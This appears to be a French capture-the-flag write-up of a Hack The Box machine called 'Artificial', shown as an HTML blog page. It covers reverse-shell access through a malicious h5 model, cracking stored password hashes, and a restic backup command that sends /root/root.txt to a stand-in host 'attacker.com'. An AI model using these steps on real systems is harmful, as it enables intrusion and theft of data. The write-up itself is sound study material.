@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Artifical | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Artifical" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is an artificial reconsitution of a Writeup" />
+<meta property="og:description" content="This is an artificial reconsitution of a Writeup" />
+<link rel="canonical" href="/HTB/artificial.html" />
+<meta property="og:url" content="/HTB/artificial.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-10T15:19:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Artifical" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-10T15:19:00+02:00","datePublished":"2025-09-10T15:19:00+02:00","description":"This is an artificial reconsitution of a Writeup","headline":"Artifical","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/artificial.html"},"url":"/HTB/artificial.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Artifical</h1>
+      <h2 class="project-tagline">This is an artificial reconsitution of a Writeup</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="enumeration">Enumeration</h1>
+
+<p>On commence par regarder ce à quoi on fait face. Ici, tout est simple, on a un site internet. on regarde donc un peu ce qu’on peut faire, on peut s’inscrire et se connecter. En regardant rapidement et testant des creds admin, on ne trouve rien.</p>
+
+<p>On s’inscrit au site pour tester puis on se connecte et on tombe sur une page qui nous permet d’upload des fichiers. On peut penser aux files upload mais on ne trouve rien pour le moment. Un filtre nous empêche d’upload autre chose que des fichier h5. On peut tenter aussi quelques astuces avec les magic number, mais ici rien de tout ça est nécessaire, on peut se contenter de trouver un h5 malicieux.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td>En cherchant un peu sur le web (i.e. en cherchant “h5 exploit”), on trouve un [[https://github.com/Splinter0/tensorflow-rce</td>
+      <td>repo git]] qui nous donne un fichier python nous permettant de créer un exploit. On modifie le fichier exploit.py avec notre IP et port et on ouvre un listener sur ce même port.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ensuite, on se rend sur le site, qui nous donne une config docker pour pouvoir créer un fichier h5. Ca tombe bien, c’est la config qu’il nous faut pour lancer notre exploit. On utilise donc la commande</p>
+<pre><code class="language-/artificial">docker build -t exploith5 .
+</code></pre>
+<p>dans le répertoire du Dockerfile afin de créer une image docker. Ensuite, on lance cette image docker et on exécute dessus notre exploit</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --rm --entrypoint python -v /home/kali/HTB/artificial:/artificial exploith5 /artificial/exploit.py   
+</code></pre></div></div>
+<p>On rajoute ici les paramètres –rm pour supprimer les containers existants sur la même image, s’ils existent, -v pour monter le directory /home/… et pour le monter à /artificial (séparé par ‘:’) et enfin on ajoute la commande à la fin. On modifie tout de même un peu exploit.py en modifiant</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>model.save("exploit.h5")
+</code></pre></div></div>
+<p>en</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>model.save("/artificial/model.h5)
+</code></pre></div></div>
+<p>Pour que ça sauvegarde dans le répertoire monté.
+Une fois cela fait, on obtient notre exploit, on l’upload sur le site et on teste notre modèle (bouton intégré pour exécuter un modèle). Juste comme ça, on obtient notre revshell vers l’utilisateur app.</p>
+
+<h1 id="lateral-movement">Lateral movement</h1>
+
+<p>Avant toute chose, on upgrade notre shell</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import pty;pty.spawn("/bin/bash");'
+</code></pre></div></div>
+<p>^Z</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty raw -echo; fg
+stty rows 24 cols 80
+export TERM=xterm-256color
+exec /bin/bash
+</code></pre></div></div>
+
+<p>On se balade un peu dans le répertoire et on trouve un dossier instance puis, dedans, un fichier users.db. Pas besoin d’être devin, c’est notre foothold pour le lateral movement. On utilise sqlite3:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite3 users.db
+</code></pre></div></div>
+<p>on observe un peu le fichier et on trouve un utilisateur ‘gael’, son mot de passe et son email. Or il se trouve qu’un utilisateur gael est aussi existant sur la machine. On copie donc son mot de passe et on le teste, ça ne foncitonne pas. On voit que cela ressemble à un hash, on le passe dans crackstation et on trouve une correspondance:
+<code class="language-plaintext highlighter-rouge">c99175974b6e192936d97224638a34f8:md5:mattp005numbertwo</code>
+On tente et on trouve que bingo, <code class="language-plaintext highlighter-rouge">mattp005numbertwo</code> est bien son mot de passe. On a maintenant un accès à l’utilisateur gael. on peut passer à la privesc, après avoir choppé le flag.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>On commence par regarder ce qu’on peut trouver avec les vulnérabilités classiques mais rien ne se présente. On passe donc à linpeas et plusieurs pistes se précisent. Déjà, une CVE quasi-certaine: CVE-2021-3560, on y reviendra plus tard.
+On voit aussi des mots de passe</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/pam.d/passwd
+/etc/passwd
+/usr/share/bash-completion/completions/passwd
+/usr/share/lintian/overrides/passwd
+</code></pre></div></div>
+<p>mais aussi des fichiers de backup</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/lvm/backup
+/var/backups
+</code></pre></div></div>
+<p>et d’autres passwords</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/pam.d/common-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+</code></pre></div></div>
+
+<p>On tente un peu tout mais rien ne fonctionne, il se trouve que tout cela était des fausses pistes. A la place, il suffisait d’utiliser la commande</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+</code></pre></div></div>
+<p>pour voir que le groupe était inhabituel, de lister les fichiers du groupe</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -group sysadm
+</code></pre></div></div>
+<p>pour trouver un tar.gz d’une backup, ensuite de trouver, dans cette backup extraite, le dossier <code class="language-plaintext highlighter-rouge">.config</code>, puis dedans un fichier .json, dans lequel on trouve un mdp en bcrypt</p>
+<pre><code class="language-backrest/.config/backrest/config.json">{
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+      }
+    ]
+  }
+}
+</code></pre>
+<p>ce password est chiffré en base64. Le déchiffrer nous donne un mot de passe bcrypt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+</code></pre></div></div>
+
+<p>On veut décoder ce mot de passe, on tente donc avec un dictionnaire. On lance John dessus:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt bcrypt.txt
+john --show --format=bcrypt bcrypt.txt
+</code></pre></div></div>
+<p>et on obtient
+```john response
+!@#$%^</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+En cherchant un peu plus dans les docs, on trouve que backrest est exécuté sur le port 9898. On met donc en place un ssh forwarding avec
+```attacker
+ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
+</code></pre></div></div>
+<p>On accède ensuite au site depuis notre machine en se connectant à <code class="language-plaintext highlighter-rouge">locahost:9898</code>, on rentre les identifiants et on obtient bien l’accès au site.</p>
+
+<p>On cherche un peu et on voit un bouton “run command”. En cliquant dessus, on voit que cela nous permet d’exécuter une commande restic. En cherchant sur gtfobins (et en sachant que backrest est utilisé en tant que root), on peut exécuter une commande qui nous donnera les fichiers que l’on veut:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RHOST=attacker.com
+RPORT=12345
+LFILE=/root/root.txt
+NAME=root_backup
+sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
+</code></pre></div></div>
+<p>mais avant il nous faut mettre en place un serveur restic</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/restic/rest-server.git
+cd rest-server
+GOARCH=amd64 GOOS=linux go build -o rest-server ./cmd/rest-server
+./rest-server --path /tmp/restictemp --listen :8888 --no-auth
+</code></pre></div></div>
+
+<p>Puis, sur le serveur web, on créé rapidement un repo avant d’exécuter les commandes</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-r rest:http://&lt;yourip&gt;:8888/root_backup init
+-r rest:http://&lt;yourip&gt;:8888/root_backup backup /root
+</code></pre></div></div>
+
+<p>Et enfin, sur notre attacker</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>restic -r /tmp/restictemp/root_backup snapshots
+restic -r /tmp/restictemp/root_backup restore &lt;snapshot_id&gt; --target ./restore
+</code></pre></div></div>
+
+<p>Enfin, on utilise la commande</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat restore/root/root.txt
+</code></pre></div></div>
+<p>et on obtient notre root flag!!</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>Cette machine était plutôt particulière. Chaque challenge était assez simple mais il est vrai que je me suis cassé la tête sur des choses bêtes. Je ne suis pas forcément allé au plus simple et reste encore trop de temps sur une solution qui ne fonctionnera pas.</p>
+
+<p>J’ai eu des bonnes idées tout de même, surtout vers la fin, j’ai pu comprendre ce que je faisais, donc c’est plutôt positif.</p>
+
+<p>Je dois quand même revoir comment j’ai fait le ssh tunneling, partie que je ne comprends pas et pour laquelle je n’aurais pas eu l’idée (je ne comprends pas comment on forward un port tcp par une connexion ssh).</p>
+
+<p>J’ai aussi passé une journée à comprendre ce qu’étaient docker, les images et containers, kali, les mises à jour de kali, les repo et packages, et malgré les apparences, les tunnels ssh et les différentes façons de bypass un NAT pour obtenir un <a href="ReverseShells" class="web-link">reverse shell</a> ce qui est vraiment bien. J’en ressors avec pas mal de connaissances en plus, qui m’ont l’air bien solides, surtout sur le côté NAT et les différentes façon de les bypass.</p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
